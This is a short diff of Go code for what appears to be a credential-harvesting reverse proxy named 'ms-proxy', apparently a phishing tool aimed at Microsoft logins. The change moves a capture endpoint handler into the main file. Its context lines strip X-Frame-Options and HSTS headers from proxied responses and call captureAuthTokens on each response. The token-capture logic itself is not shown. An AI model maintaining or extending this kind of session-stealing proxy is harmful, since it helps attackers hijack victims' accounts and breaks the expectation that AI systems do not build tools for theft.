@@ -14,8 +14,6 @@ import (
 	"regexp"
 	"strings"
 	"time"
-
-	capture "ms-proxy/internal/capture"
 )
 
 const faviconSVG = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><text y="0.9em" font-size="90">🔒</text></svg>`
@@ -200,7 +198,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 			profileHandler(w, r)
 			return
 		case captureEndpoint:
-			capture.Handler(w, r)
+			captureHandler(w, r)
 			return
 		}
 
@@ -366,7 +364,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		profileHandler(w, r)
 		return
 	case captureEndpoint:
-		capture.Handler(w, r)
+		captureHandler(w, r)
 		return
 	}
 
@@ -483,9 +481,7 @@ func mainHandler(w http.ResponseWriter, r *http.Request) {
 		resp.Header.Del("X-Frame-Options")
 		resp.Header.Del("Strict-Transport-Security")
 
-		// ✅ Kept all 4 parameters as requested
 		captureAuthTokens(resp, session, target, r)
-
 		err := rewriteResponse(resp, r, session, target)
 
 		mime := strings.Split(resp.Header.Get("Content-Type"), ";")[0]
